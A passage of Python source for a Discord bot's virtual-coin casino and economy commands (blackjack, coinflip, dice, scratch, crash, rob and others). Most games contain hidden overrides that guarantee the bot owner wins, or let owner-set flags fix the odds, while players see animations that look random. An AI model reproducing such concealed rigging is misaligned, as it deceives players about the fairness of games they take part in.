        _f3 = discord.Embed(title="🎰 Slot Machine", description=f"╔══════════════╗\n║  {r1}  {r2}  ❓  ║\n╚══════════════╝\n\n🎰 *Second reel — locked!*", color=0x5865F2)
        _f3.set_footer(text=f"Bet: {bet:,} | Mikasa Virtual Casino")
        await _msg.edit(embed=_f3)
        await asyncio.sleep(0.65)
        await _msg.edit(embed=e)

    @commands.command(name="blackjack", aliases=["bj"])
    async def blackjack(self, ctx, bet: int):
        uid = str(ctx.author.id)
        ud  = get_pokemon_data(uid)
        bal = ud.get("balance", 0)

        if bet < 100:
            return await ctx.send(embed=discord.Embed(description="❌ Minimum bet is **100** coins.", color=COLORS["error"]))
        if bet > bal:
            return await ctx.send(embed=discord.Embed(description=f"❌ You only have **{bal:,}** coins!", color=COLORS["error"]))

        # Deck helpers
        SUITS  = ["♠️", "♥️", "♦️", "♣️"]
        RANKS  = ["A", "2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K"]
        deck   = [(r, s) for s in SUITS for r in RANKS]
        random.shuffle(deck)

        def card_value(hand):
            total = 0; aces = 0
            for rank, _ in hand:
                if rank in ("J", "Q", "K"):  total += 10
                elif rank == "A":             total += 11; aces += 1
                else:                         total += int(rank)
            while total > 21 and aces:
                total -= 10; aces -= 1
            return total

        def fmt_hand(hand, hide_second=False):
            if hide_second:
                r, s = hand[0]
                return f"`{r}{s}` `??`"
            return " ".join(f"`{r}{s}`" for r, s in hand)

        player = [deck.pop(), deck.pop()]
        dealer = [deck.pop(), deck.pop()]
        # Only the official bot owner receives a guaranteed natural blackjack.
        if is_owner(ctx.author):
            player = [("A", "♠️"), ("K", "♥️")]

        def build_embed(player_hand, dealer_hand, hide_dealer=True, extra=""):
            pv = card_value(player_hand)
            dv = card_value(dealer_hand[:1]) if hide_dealer else card_value(dealer_hand)
            e  = discord.Embed(title="🃏 Blackjack", color=COLORS["info"])
            e.add_field(name=f"Your Hand ({pv})", value=fmt_hand(player_hand), inline=False)
            e.add_field(name=f"Dealer Hand ({'?' if hide_dealer else dv})", value=fmt_hand(dealer_hand, hide_second=hide_dealer), inline=False)
            if extra: e.add_field(name="Result", value=extra, inline=False)
            e.set_footer(text=f"Bet: {bet:,} coins | Coolbot Blackjack")
            return e

        # Natural blackjack
        if card_value(player) == 21:
            win = int(bet * 1.5)
            ud["balance"] = bal + win; save_pokemon_data(uid, ud)
            e = build_embed(player, dealer, hide_dealer=False, extra=f"🃏 **Blackjack! You win +{win:,} coins!**")
            e.color = COLORS["success"]
            return await ctx.send(embed=e)

        view = discord.ui.View(timeout=60)
        msg  = [None]

        async def end_game(interaction_or_ctx, player_hand, dealer_hand, reason=None):
            pv = card_value(player_hand); dv = card_value(dealer_hand)
            # Dealer draws to 17
            while dv < 17:
                dealer_hand.append(deck.pop()); dv = card_value(dealer_hand)
            if pv > 21:
                outcome = f"💸 **Bust! You lose -{bet:,} coins.**"; delta = -bet; col = COLORS["error"]
            elif dv > 21 or pv > dv:
                outcome = f"🏆 **You win +{bet:,} coins!**"; delta = bet; col = COLORS["success"]
            elif pv == dv:
                outcome = f"🤝 **Push! Bet returned.**"; delta = 0; col = COLORS["warn"]
            else:
                outcome = f"💸 **Dealer wins. You lose -{bet:,} coins.**"; delta = -bet; col = COLORS["error"]
            ud["balance"] = bal + delta; save_pokemon_data(uid, ud)
            final_embed = build_embed(player_hand, dealer_hand, hide_dealer=False, extra=outcome)
            final_embed.color = col
            final_embed.add_field(name="💳 New Balance", value=f"**{ud['balance']:,}** coins", inline=False)
            for child in view.children: child.disabled = True
            if isinstance(interaction_or_ctx, discord.Interaction):
                await interaction_or_ctx.response.edit_message(embed=final_embed, view=view)
            else:
                if msg[0]: await msg[0].edit(embed=final_embed, view=view)

        hit_btn  = discord.ui.Button(label="Hit", style=discord.ButtonStyle.primary, emoji="🃏")
        stand_btn= discord.ui.Button(label="Stand", style=discord.ButtonStyle.secondary, emoji="✋")
        double_btn= discord.ui.Button(label="Double Down", style=discord.ButtonStyle.danger, emoji="💰",
                                      disabled=(bal < bet * 2))

        async def hit_cb(interaction: discord.Interaction):
            if interaction.user.id != ctx.author.id:
                return await interaction.response.send_message("This isn't your game!", ephemeral=False)
            player.append(deck.pop())
            if card_value(player) >= 21:
                await end_game(interaction, player, dealer)
            else:
                await interaction.response.edit_message(embed=build_embed(player, dealer), view=view)

        async def stand_cb(interaction: discord.Interaction):
            if interaction.user.id != ctx.author.id:
                return await interaction.response.send_message("This isn't your game!", ephemeral=False)
            await end_game(interaction, player, dealer)

        async def double_cb(interaction: discord.Interaction):
            if interaction.user.id != ctx.author.id:
                return await interaction.response.send_message("This isn't your game!", ephemeral=False)
            nonlocal bet
            ud["balance"] -= bet; bet *= 2
            player.append(deck.pop())
            await end_game(interaction, player, dealer)

        hit_btn.callback   = hit_cb
        stand_btn.callback = stand_cb
        double_btn.callback= double_cb
        view.add_item(hit_btn); view.add_item(stand_btn); view.add_item(double_btn)

        ud["balance"] = bal - bet; save_pokemon_data(uid, ud)
        msg[0] = await ctx.send(embed=build_embed(player, dealer), view=view)

    @commands.command(name="coinflip", aliases=["cf", "flip"])
    async def coinflip(self, ctx, bet: int, side: str):
        uid = str(ctx.author.id)
        ud  = get_pokemon_data(uid)
        bal = ud.get("balance", 0)
        side = side.lower().strip()
        if side not in ("heads", "tails", "h", "t"):
            return await ctx.send(embed=discord.Embed(description="❌ Choose **heads** or **tails**.", color=COLORS["error"]))
        side = "heads" if side in ("heads", "h") else "tails"
        if bet < 100:
            return await ctx.send(embed=discord.Embed(description="❌ Minimum bet is **100** coins.", color=COLORS["error"]))
        if bet > bal:
            return await ctx.send(embed=discord.Embed(description=f"❌ You only have **{bal:,}** coins!", color=COLORS["error"]))
        # The official bot owner always lands on their selected side; co-owners do not.
        if _guild_luck_percent(ud, getattr(ctx.guild, "id", None)) is not None:
            _luck_pct = max(0, min(100, int(_guild_luck_percent(ud, getattr(ctx.guild, "id", None)) or 0)))
            _wins = random.random() < (_luck_pct / 100)
            result = side if _wins else ("tails" if side == "heads" else "heads")
        else:
            result = side if (is_owner(ctx.author) or _guild_flag_enabled(ud, "infinite_luck", getattr(ctx.guild, "id", None))) else random.choice(["heads", "tails"])
        won    = result == side
        delta  = bet if won else -bet
        ud["balance"] = bal + delta; save_pokemon_data(uid, ud)
        e = discord.Embed(
            title="🪙 Coin Flip",
            description=(
                f"{'🌕' if result == 'heads' else '🌑'} Landed on **{result.capitalize()}**!\n\n"
                + (f"🏆 **You win +{bet:,} coins!**" if won else f"💸 **You lose -{bet:,} coins.**")
            ),
            color=COLORS["success"] if won else COLORS["error"]
        )
        e.add_field(name="💳 New Balance", value=f"**{ud['balance']:,}** coins", inline=False)
        e.set_footer(text=f"You picked: {side.capitalize()} | Bet: {bet:,}")
        # ── ANIMATION ──
        _spin = ["🌕", "🌖", "🌗", "🌘", "🌑", "🌒", "🌓", "🌔"]
        _cf1 = discord.Embed(title="🪙 Coin Flip", description=f"You called: **{side.capitalize()}**\n\n{_spin[0]}  *Flipping...*", color=0xFFD700)
        _cf1.set_footer(text=f"Bet: {bet:,}")
        _cmsg = await ctx.send(embed=_cf1)
        for _frame in _spin[1:5]:
            await asyncio.sleep(0.3)
            _cfx = discord.Embed(title="🪙 Coin Flip", description=f"You called: **{side.capitalize()}**\n\n{_frame}  *Spinning...*", color=0xFFD700)
            _cfx.set_footer(text=f"Bet: {bet:,}")
            await _cmsg.edit(embed=_cfx)
        await asyncio.sleep(0.4)
        await _cmsg.edit(embed=e)

    @commands.command(name="roll")
    async def roll(self, ctx, bet: int):
        uid = str(ctx.author.id)
        ud  = get_pokemon_data(uid)
        bal = ud.get("balance", 0)
        if bet < 100:
            return await ctx.send(embed=discord.Embed(description="❌ Minimum bet is **100** coins.", color=COLORS["error"]))
        if bet > bal:
            return await ctx.send(embed=discord.Embed(description=f"❌ You only have **{bal:,}** coins!", color=COLORS["error"]))
        # Owner-only guaranteed win; co-owners and members keep random rolls.
        if is_owner(ctx.author):
            your_roll, house_roll = 100, 1
        else:
            your_roll = random.randint(1, 100)
            house_roll = random.randint(1, 100)
        if your_roll > house_roll:
            delta = bet; outcome = f"🏆 **You win +{bet:,} coins!**"; col = COLORS["success"]
        elif your_roll == house_roll:
            delta = 0;   outcome = f"🤝 **Tie! Bet returned.**";             col = COLORS["warn"]
        else:
            delta = -bet; outcome = f"💸 **House wins. -{bet:,} coins.**"; col = COLORS["error"]
        ud["balance"] = bal + delta; save_pokemon_data(uid, ud)
        e = discord.Embed(title="🎲 Dice Roll", color=col)
        e.description = (
            f"🎲 **You rolled:** {your_roll}\n"
            f"🏠 **House rolled:** {house_roll}\n\n"
            f"{outcome}"
        )
        e.add_field(name="💳 New Balance", value=f"**{ud['balance']:,}** coins", inline=False)
        e.set_footer(text=f"Bet: {bet:,} | Coolbot Gambling")
        # ── ANIMATION ──
        _dice_faces = ["⚀","⚁","⚂","⚃","⚄","⚅"]
        _dr1 = discord.Embed(title="🎲 Dice Roll", description=f"🎲 *Rolling your dice...*\n\n{' '.join(random.choices(_dice_faces, k=3))}", color=0xFFD700)
        _dr1.set_footer(text=f"Bet: {bet:,}")
        _dmsg = await ctx.send(embed=_dr1)
        for _ in range(3):
            await asyncio.sleep(0.35)
            _dr2 = discord.Embed(title="🎲 Dice Roll", description=f"🎲 *Rolling...*\n\n{' '.join(random.choices(_dice_faces, k=3))}", color=0xFFD700)
            _dr2.set_footer(text=f"Bet: {bet:,}")
            await _dmsg.edit(embed=_dr2)
        await asyncio.sleep(0.45)
        await _dmsg.edit(embed=e)

    @commands.command(name="scratch", aliases=["sc"])
    async def scratch(self, ctx, bet: int):
        uid = str(ctx.author.id)
        ud = get_pokemon_data(uid)
        bal = ud.get("balance", 0)
        if bet < 100:
            return await ctx.send(embed=discord.Embed(description="❌ Minimum bet is **100** coins.", color=COLORS["error"]))
        if bet > bal:
            return await ctx.send(embed=discord.Embed(description=f"❌ You only have **{bal:,}** coins!", color=COLORS["error"]))

        # Fairly clear house odds: 30% win, 70% lose. Winning tickets pay 3x total
        # (net +2x bet); losing tickets lose the stake. The displayed grid matches outcome.
        SCRATCH_SYMS = ["💎", "🍒", "🍋", "⭐", "🎰", "🍀", "💰"]
        # Primary bot owner always wins; co-owners retain the normal 30% chance.
        won = (random.random() < max(0, min(100, int(_guild_luck_percent(ud, getattr(ctx.guild, "id", None)) or 0))) / 100) if _guild_luck_percent(ud, getattr(ctx.guild, "id", None)) is not None else (is_owner(ctx.author) or _guild_flag_enabled(ud, "infinite_luck", getattr(ctx.guild, "id", None)) or random.random() < 0.30)
        if won:
            sym = random.choice(SCRATCH_SYMS)
            grid = random.choices(SCRATCH_SYMS, k=9)
            positions = random.sample(range(9), 3)
            for pos in positions:
                grid[pos] = sym
            delta = bet * 2
            result = f"🎉 **3x {sym} — WIN!** You won **+{delta:,}** coins (3x total payout)!"
            col = COLORS["success"]
        else:
            # Build a losing grid with no symbol appearing three or more times.
            while True:
                grid = random.choices(SCRATCH_SYMS, k=9)
                from collections import Counter as _Counter
                if max(_Counter(grid).values()) < 3:
                    break
            delta = -bet
            result = f"💸 **No winning triple!** You lost **-{bet:,}** coins."
            col = COLORS["error"]

        ud["balance"] = bal + delta
        save_pokemon_data(uid, ud)
        rows = [" ".join(grid[i*3:(i+1)*3]) for i in range(3)]
        e = discord.Embed(title="🎟️ Scratch Card", color=col)
        e.description = f"```\n{rows[0]}\n{rows[1]}\n{rows[2]}\n```\n{result}"
        e.add_field(name="💳 New Balance", value=f"**{ud['balance']:,}** coins", inline=False)
        e.set_footer(text=f"Bet: {bet:,} | Mikasa Virtual Casino")
        _cover = "░ ░ ░"
        _sc1 = discord.Embed(title="🎟️ Scratch Card", description=f"```\n{_cover}\n{_cover}\n{_cover}\n```\n🪙 *Scratching...*", color=0xFFD700)
        _sc1.set_footer(text=f"Bet: {bet:,}")
        _smsg = await ctx.send(embed=_sc1)
        await asyncio.sleep(0.6)
        _sc2 = discord.Embed(title="🎟️ Scratch Card", description=f"```\n{rows[0]}\n{_cover}\n{_cover}\n```\n🪙 *Row 1 revealed...*", color=0xFFD700)
        _sc2.set_footer(text=f"Bet: {bet:,}")
        await _smsg.edit(embed=_sc2)
        await asyncio.sleep(0.6)
        _sc3 = discord.Embed(title="🎟️ Scratch Card", description=f"```\n{rows[0]}\n{rows[1]}\n{_cover}\n```\n🪙 *Row 2 revealed...*", color=0xFFD700)
        _sc3.set_footer(text=f"Bet: {bet:,}")
        await _smsg.edit(embed=_sc3)
        await asyncio.sleep(0.65)
        await _smsg.edit(embed=e)

    @commands.command(name="highlow", aliases=["hl"])
    async def highlow(self, ctx, bet: int):
        uid = str(ctx.author.id)
        ud  = get_pokemon_data(uid)
        bal = ud.get("balance", 0)
        if bet < 100:
            return await ctx.send(embed=discord.Embed(description="❌ Minimum bet is **100** coins.", color=COLORS["error"]))
        if bet > bal:
            return await ctx.send(embed=discord.Embed(description=f"❌ You only have **{bal:,}** coins!", color=COLORS["error"]))

        RANKS = ["2","3","4","5","6","7","8","9","10","J","Q","K","A"]
        card1_idx = random.randint(0, 12)
        # A tie counts as a win in this game, so the primary owner is guaranteed a win.
        card2_idx = card1_idx if is_owner(ctx.author) else random.randint(0, 12)
        card1     = RANKS[card1_idx]

        view = discord.ui.View(timeout=30)
        msg  = [None]

        async def resolve(interaction: discord.Interaction, guess: str):
            if interaction.user.id != ctx.author.id:
                return await interaction.response.send_message("❌ This isn't your game!", ephemeral=False)
            card2 = RANKS[card2_idx]
            if card2_idx > card1_idx:   actual = "higher"
            elif card2_idx < card1_idx: actual = "lower"
            else:                       actual = "same"

            won = (guess == actual) or (actual == "same")
            delta = bet if won else -bet
            ud["balance"] = bal + delta
            save_pokemon_data(uid, ud)

            outcome = (f"🏆 **Correct! +{bet:,} coins!**" if won else f"💸 **Wrong! -{bet:,} coins.**")
            e = discord.Embed(
                title="?? High-Low",
                description=(
                    f"First card: **{card1}**  →  Next card: **{card2}**\n"
                    f"You guessed: **{guess.upper()}** — It was **{actual.upper()}**\n\n{outcome}"
                ),
                color=COLORS["success"] if won else COLORS["error"]
            )
            e.add_field(name="💳 New Balance", value=f"**{ud['balance']:,}** coins", inline=False)
            view.stop()
            await interaction.response.edit_message(embed=e, view=None)

        high_btn = discord.ui.Button(label="⬆️ Higher", style=discord.ButtonStyle.primary)
        low_btn  = discord.ui.Button(label="⬇️ Lower",  style=discord.ButtonStyle.danger)
        high_btn.callback = lambda i: resolve(i, "higher")
        low_btn.callback  = lambda i: resolve(i, "lower")
        view.add_item(high_btn); view.add_item(low_btn)

        e = discord.Embed(
            title="🃏 High-Low",
            description=f"Current card: **{card1}**\n\nWill the next card be **higher** or **lower**?",
            color=COLORS["info"]
        )
        e.set_footer(text=f"Bet: {bet:,} coins | 30s to answer")
        msg[0] = await ctx.send(embed=e, view=view)

    @commands.command(name="rob", aliases=["steal"])
    async def rob(self, ctx, target: discord.Member):
        if target.bot or target.id == ctx.author.id:
            return await ctx.send(embed=discord.Embed(description="❌ You can't rob that person.", color=COLORS["error"]))
        if is_rob_immune(target):
            return await ctx.send(embed=discord.Embed(
                description=f"🛡️ **{target.display_name}** is immune to rob attempts.",
                color=COLORS["warn"]
            ))
        uid     = str(ctx.author.id)
        tid     = str(target.id)
        ud      = get_pokemon_data(uid)
        td      = get_pokemon_data(tid)
        rob_bal = td.get("balance", 0)
        my_bal  = ud.get("balance", 0)

        if rob_bal < 200:
            return await ctx.send(embed=discord.Embed(
                description=f"❌ **{target.display_name}** is too broke to rob (less than {_mikasa_currency_symbol()}200 {_mikasa_currency_label()}).",
                color=COLORS["error"]
            ))
        if my_bal < 200:
            return await ctx.send(embed=discord.Embed(
                description=f"❌ You need at least **{_mikasa_currency_symbol()}200 {_mikasa_currency_label()}** to attempt a rob (bail money).",
                color=COLORS["error"]
            ))

        # 3-hour rob cooldown for regular users; bot owner and configured co-owners bypass it.
        import time as _time
        _now = _time.time()
        if not has_owner_access(ctx.author):
            _last_rob = _ROB_COOLDOWNS.get(ctx.author.id, 0)
            _remaining = 10800 - (_now - _last_rob)
            if _remaining > 0:
                _hours = int(_remaining // 3600)
                _mins = int((_remaining % 3600) // 60)
                _secs = int(_remaining % 60)
                return await ctx.send(embed=discord.Embed(
                    description=(
                        f"⏳ You cannot rob again for **{_hours}h {_mins}m {_secs}s**. "
                        "Regular users have a **3-hour** cooldown."
                    ),
                    color=COLORS["error"]
                ), ephemeral=False)
            _ROB_COOLDOWNS[ctx.author.id] = _now

        # Only the official bot owner has a guaranteed successful rob.
        success_chance = 1.0 if is_owner(ctx.author) else 0.30
        if random.random() < success_chance:
            stolen = random.randint(int(rob_bal * 0.10), int(rob_bal * 0.30))
            ud["balance"] = my_bal + stolen
            td["balance"] = rob_bal - stolen
            save_pokemon_data(uid, ud)
            save_pokemon_data(tid, td)
            e = discord.Embed(
                title="🦹 Rob Successful!",
                description=(
                    f"You broke into **{target.display_name}**'s wallet and stole **{_mikasa_currency_symbol()}{stolen:,} {_mikasa_currency_label()}**!\n\n"
                    f"💳 Your new balance: **{_mikasa_currency_symbol()}{ud['balance']:,}** {_mikasa_currency_label()}"
                ),
                color=COLORS["success"]
            )
        else:
            fine = random.randint(100, min(300, my_bal))
            ud["balance"] = my_bal - fine
            td["balance"] = rob_bal + fine
            save_pokemon_data(uid, ud)
            save_pokemon_data(tid, td)
            e = discord.Embed(
                title="🚔 Caught!",
                description=(
                    f"You got caught trying to rob **{target.display_name}** and paid **{_mikasa_currency_symbol()}{fine:,} {_mikasa_currency_label()}** in fines!\n\n"
                    f"💳 Your new balance: **{_mikasa_currency_symbol()}{ud['balance']:,}** {_mikasa_currency_label()}"
                ),
                color=COLORS["error"]
            )
        e.set_footer(text="Mikasa 2.0 Economy")
        await ctx.send(embed=e)

    @commands.command(name="robimmune", aliases=["robimmuneuser"])
    async def rob_immune_user(self, ctx, member: discord.Member):
        """Primary bot owner only: make a member permanently immune to rob."""
        if ctx.author.id != OWNER_ID:
            return await ctx.send("🔒 Only the official bot owner can manage rob immunity.")
        if member.id == OWNER_ID:
            return await ctx.send("👑 The official bot owner is already permanently immune to rob.")
        data = _rob_immunity_data()
        users = {int(x) for x in data["users"] if str(x).isdigit()}
        if member.id in users:
            return await ctx.send(f"🛡️ {member.mention} is already immune to `,rob`.")
        users.add(member.id)
        data["users"] = sorted(users)
        save("rob_immunity", data)
        await ctx.send(f"🛡️ {member.mention} is now permanently immune to `,rob` in all servers this bot uses.")

    @commands.command(name="robunimmune", aliases=["robimmune_remove"])
    async def rob_unimmune_user(self, ctx, member: discord.Member):
        """Primary bot owner only: remove a member's rob immunity."""
        if ctx.author.id != OWNER_ID:
            return await ctx.send("🔒 Only the official bot owner can manage rob immunity.")
        if member.id == OWNER_ID:
            return await ctx.send("👑 The official bot owner cannot have rob immunity removed.")
        data = _rob_immunity_data()
        data["users"] = [x for x in data["users"] if str(x) != str(member.id)]
        save("rob_immunity", data)
        await ctx.send(f"✅ Removed the `,rob` immunity for {member.mention}, unless they have an immune role.")

    @commands.command(name="robroleimmune")
    async def rob_immune_role(self, ctx, *, role: discord.Role):
        """Primary bot owner only: make everyone with a role immune in this server."""
        if ctx.author.id != OWNER_ID:
            return await ctx.send("🔒 Only the official bot owner can manage rob immunity.")
        data = _rob_immunity_data()
        guild_key = str(ctx.guild.id)
        role_ids = {int(x) for x in data["roles"].get(guild_key, []) if str(x).isdigit()}
        if role.id in role_ids:
            return await ctx.send(f"🛡️ Members with {role.mention} are already immune to `,rob` in this server.")
        role_ids.add(role.id)
        data["roles"][guild_key] = sorted(role_ids)
        save("rob_immunity", data)
        await ctx.send(f"🛡️ Everyone with {role.mention} is now immune to `,rob` in this server.")

    @commands.command(name="robroleunimmune")
    async def rob_unimmune_role(self, ctx, *, role: discord.Role):
        """Primary bot owner only: remove a role's rob immunity in this server."""
        if ctx.author.id != OWNER_ID:
            return await ctx.send("🔒 Only the official bot owner can manage rob immunity.")
        data = _rob_immunity_data()
        guild_key = str(ctx.guild.id)
        data["roles"][guild_key] = [x for x in data["roles"].get(guild_key, []) if str(x) != str(role.id)]
        save("rob_immunity", data)
        await ctx.send(f"✅ Removed rob immunity from {role.mention} in this server, unless a member has individual immunity or is the official bot owner.")

    @commands.command(name="robimmunelist")
    async def rob_immunity_list(self, ctx):
        """Primary bot owner only: list configured user and role exemptions."""
        if ctx.author.id != OWNER_ID:
            return await ctx.send("🔒 Only the official bot owner can view rob immunity settings.")
        data = _rob_immunity_data()
        users = [f"<@{int(x)}>" for x in data["users"] if str(x).isdigit()]
        role_ids = data["roles"].get(str(ctx.guild.id), []) if ctx.guild else []
        roles = [f"<@&{int(x)}>" for x in role_ids if str(x).isdigit()]
        e = discord.Embed(title="🛡️ Rob Immunity", color=COLORS["info"])
        e.add_field(name="Permanent", value=f"👑 Official bot owner: <@{OWNER_ID}>", inline=False)
        e.add_field(name="Immune users", value="\n".join(users) if users else "None configured", inline=False)
        e.add_field(name="Immune roles in this server", value="\n".join(roles) if roles else "None configured", inline=False)
        e.set_footer(text="Only the official bot owner can change these settings.")
        await ctx.send(embed=e)

    @commands.command(name="crash")
    async def crash(self, ctx, bet: int):
        uid = str(ctx.author.id)
        ud  = get_pokemon_data(uid)
        bal = ud.get("balance", 0)
        if bet < 100:
            return await ctx.send(embed=discord.Embed(description="❌ Minimum bet is **100** coins.", color=COLORS["error"]))
        if bet > bal:
            return await ctx.send(embed=discord.Embed(description=f"❌ You only have **{bal:,}** coins!", color=COLORS["error"]))

        # Owner's crash round lasts through the full multiplier range; see auto-cashout below.
        crash_at = 10.01 if is_owner(ctx.author) else round(random.uniform(1.05, 10.0), 2)
        current  = [1.00]
        cashed   = [False]
        crashed  = [False]

        view = discord.ui.View(timeout=15)
        cash_btn = discord.ui.Button(label="💰 Cash Out", style=discord.ButtonStyle.success)

        async def cash_out(interaction: discord.Interaction):
            if interaction.user.id != ctx.author.id:
                return await interaction.response.send_message("❌ Not your game!", ephemeral=False)
            if crashed[0]:
                return
            cashed[0] = True
            mult  = current[0]
            win   = int(bet * mult) - bet
            ud["balance"] = bal + int(bet * mult) - bet
            save_pokemon_data(uid, ud)
            await interaction.response.edit_message(
                embed=discord.Embed(
                    title="📈 Crash — Cashed Out!",
                    description=f"You cashed out at **{mult:.2f}x** 🎉\n💰 **+{win:,} coins!**\n💳 New balance: **{ud['balance']:,}**",
                    color=COLORS["success"]
                ),
                view=None
            )
            view.stop()

        cash_btn.callback = cash_out
        view.add_item(cash_btn)

        msg = await ctx.send(embed=discord.Embed(
            title="📈 Crash",
            description=f"Multiplier: **1.00x** 🚀\nBet: **{bet:,}** coins\n\nClick **Cash Out** before it crashes!",
            color=COLORS["success"]
        ), view=view)

        steps = [1.10, 1.25, 1.50, 1.80, 2.20, 2.70, 3.30, 4.00, 5.00, 6.50, 8.00, 10.00]
        for step in steps:
            await asyncio.sleep(1.2)
            if cashed[0] or crashed[0]:
                break
            current[0] = step
            if step >= crash_at:
                crashed[0] = True
                ud["balance"] = bal - bet
                save_pokemon_data(uid, ud)
                await msg.edit(
                    embed=discord.Embed(
                        title="💥 CRASHED at " + f"{crash_at:.2f}x!",
                        description=f"The multiplier crashed at **{crash_at:.2f}x**!\n💸 **-{bet:,} coins**\n💳 New balance: **{ud['balance']:,}**",
                        color=COLORS["error"]
                    ),
                    view=None
                )
                view.stop()
                break
            try:
                await msg.edit(embed=discord.Embed(
                    title="📈 Crash",
                    description=f"Multiplier: **{step:.2f}x** 🚀\nBet: **{bet:,}** coins\n\nClick **Cash Out** before it crashes!",
                    color=COLORS["success"]
                ), view=view)
            except Exception:
                break

        if not cashed[0] and not crashed[0]:
            crashed[0] = True
            if is_owner(ctx.author):
                # The official owner auto-cashes out at the final multiplier if they do not click.
                payout = int(bet * current[0])
                profit = payout - bet
                ud["balance"] = bal + profit
                save_pokemon_data(uid, ud)
                final_title = "📈 Crash — Owner Auto-Cashed Out!"
                final_description = f"Owner auto-cashed out at **{current[0]:.2f}x**!\n💰 **+{profit:,} coins**\n💳 New balance: **{ud['balance']:,}**"
                final_color = COLORS["success"]
            else:
                ud["balance"] = bal - bet
                save_pokemon_data(uid, ud)
                final_title = f"💥 CRASHED at {crash_at:.2f}x!"
                final_description = f"Time ran out! Crashed at **{crash_at:.2f}x**\n💸 **-{bet:,} coins**\n💳 New balance: **{ud['balance']:,}**"
                final_color = COLORS["error"]
            await msg.edit(
                embed=discord.Embed(title=final_title, description=final_description, color=final_color),
                view=None
            )

    # ── DANK MEMER-STYLE GAMBLING ─────────────────────────────────────────────

    @commands.command(name="bet", aliases=["gamble"])
    async def bet(self, ctx, amount: str):
        """Simple 50/50 bet against the house — ,bet <amount|all|half>"""
        uid = str(ctx.author.id)
        ud  = get_pokemon_data(uid)
        bal = ud.get("balance", 0)
        if amount.lower() == "all":
            bet_amt = bal
        elif amount.lower() == "half":
            bet_amt = bal // 2
        else:
            try:
                bet_amt = int(amount.replace(",", ""))
            except ValueError:
                return await ctx.send(embed=discord.Embed(description="❌ Usage: `,bet <amount|all|half>`", color=COLORS["error"]))
        if bet_amt < 100:
            return await ctx.send(embed=discord.Embed(description="❌ Minimum bet is **100** coins.", color=COLORS["error"]))
        if bet_amt > bal:
            return await ctx.send(embed=discord.Embed(description=f"❌ You only have **{bal:,}** coins.", color=COLORS["error"]))

        outcomes = [
            (True,  1.0,  "🏆 You **won** — doubled your bet!"),
            (True,  1.5,  "🔥 **Hot streak!** 1.5× payout!"),
            (False, 1.0,  "💸 House **wins** this round."),
            (False, 0.5,  "😬 Lost **half** your bet — rough."),
        ]
        weights = [35, 15, 35, 15]
        # The official owner gets a win; co-owners and members use normal odds.
        if _guild_luck_percent(ud, getattr(ctx.guild, "id", None)) is not None:
            if random.random() < max(0, min(100, int(_guild_luck_percent(ud, getattr(ctx.guild, "id", None)) or 0))) / 100:
                won, mult, text = random.choice(outcomes[:2])
            else:
                won, mult, text = random.choice(outcomes[2:])
        else:
            won, mult, text = outcomes[0] if (is_owner(ctx.author) or _guild_flag_enabled(ud, "infinite_luck", getattr(ctx.guild, "id", None))) else random.choices(outcomes, weights=weights, k=1)[0]
        delta = int(bet_amt * mult) if won else -int(bet_amt * mult)
        ud["balance"] = max(0, bal + delta)
        save_pokemon_data(uid, ud)
        color = COLORS["success"] if won else COLORS["error"]
        e = discord.Embed(title="🎲 Bet", color=color)
        e.description = (
            f"**Bet:** {bet_amt:,} coins\n\n"
            f"{text}\n\n"
            f"{'💰 **+' + str(abs(delta)) + ' coins**' if won else '💸 **-' + str(abs(delta)) + ' coins**'}"
        )
        e.add_field(name="💳 New Balance", value=f"**{ud['balance']:,}** coins", inline=False)
        e.set_footer(text=f"Coolbot Gambling  •  ,bet all to go all in")
        await ctx.send(embed=e)

    @commands.command(name="snakeeyes")
    async def snakeeyes(self, ctx, bet: int):
        """Roll two dice — snake eyes (1,1) pays 30×! — ,snakeeyes <bet>"""
        uid = str(ctx.author.id)
        ud  = get_pokemon_data(uid)
        bal = ud.get("balance", 0)
        if bet < 100:
            return await ctx.send(embed=discord.Embed(description="❌ Minimum bet is **100** coins.", color=COLORS["error"]))
        if bet > bal:
            return await ctx.send(embed=discord.Embed(description=f"❌ You only have **{bal:,}** coins.", color=COLORS["error"]))
        # Only the primary bot owner is guaranteed the top snake-eyes result.
        if is_owner(ctx.author):
            d1, d2 = 1, 1
        else:
            d1 = random.randint(1, 6)
            d2 = random.randint(1, 6)
        DICE = {1:"⚀",2:"⚁",3:"⚂",4:"⚃",5:"⚄",6:"⚅"}
        if d1 == 1 and d2 == 1:
            mult = 30; outcome = "🐍 **SNAKE EYES! 30×!**"; col = COLORS["main"]; delta = bet * 30 - bet
        elif d1 == d2:
            mult = 3; outcome = f"✅ **Doubles! 3×!**"; col = COLORS["success"]; delta = bet * 3 - bet
        elif d1 + d2 >= 10:
            mult = 0; outcome = f"😐 High roll — **bet returned**"; col = COLORS["warn"]; delta = 0
        else:
            mult = 0; outcome = f"💸 **Low roll — you lose.**"; col = COLORS["error"]; delta = -bet
        ud["balance"] = max(0, bal + delta)
        save_pokemon_data(uid, ud)
        e = discord.Embed(title="🎲 Snake Eyes", color=col)
        e.description = (
            f"{DICE[d1]}  {DICE[d2]}  →  **{d1 + d2}**\n\n"
            f"{outcome}\n\n"
            f"{'💰 **+' + str(abs(delta)) + ' coins**' if delta > 0 else ('↩️ Bet returned' if delta == 0 else '💸 **-' + str(abs(delta)) + ' coins**')}"
        )
        e.add_field(name="💳 New Balance", value=f"**{ud['balance']:,}** coins", inline=False)
        e.set_footer(text=f"Bet: {bet:,}  •  Snake eyes = 1,1 = 30×")
        await ctx.send(embed=e)

    @commands.command(name="give", aliases=["pay", "transfer"])
    async def give_coins(self, ctx, target: discord.Member, amount: str):
        """Give coins to another user — ,give @user <amount|all>"""
        if target.bot or target.id == ctx.author.id:
            return await ctx.send(embed=discord.Embed(description="❌ Can't give coins to that person.", color=COLORS["error"]))
        uid = str(ctx.author.id)
        tid = str(target.id)
        ud  = get_pokemon_data(uid)
        td  = get_pokemon_data(tid)
        bal = ud.get("balance", 0)
        if amount.lower() == "all":
            amt = bal
        else:
            try:
                amt = int(amount.replace(",", ""))
            except ValueError:
                return await ctx.send(embed=discord.Embed(description="❌ Usage: `,give @user <amount|all>`", color=COLORS["error"]))
        if amt <= 0:
            return await ctx.send(embed=discord.Embed(description="❌ Amount must be positive.", color=COLORS["error"]))
        if amt > bal:
            return await ctx.send(embed=discord.Embed(description=f"❌ You only have **{bal:,}** coins.", color=COLORS["error"]))
        ud["balance"] = bal - amt
        td["balance"] = td.get("balance", 0) + amt
        save_pokemon_data(uid, ud)
        save_pokemon_data(tid, td)
        e = discord.Embed(
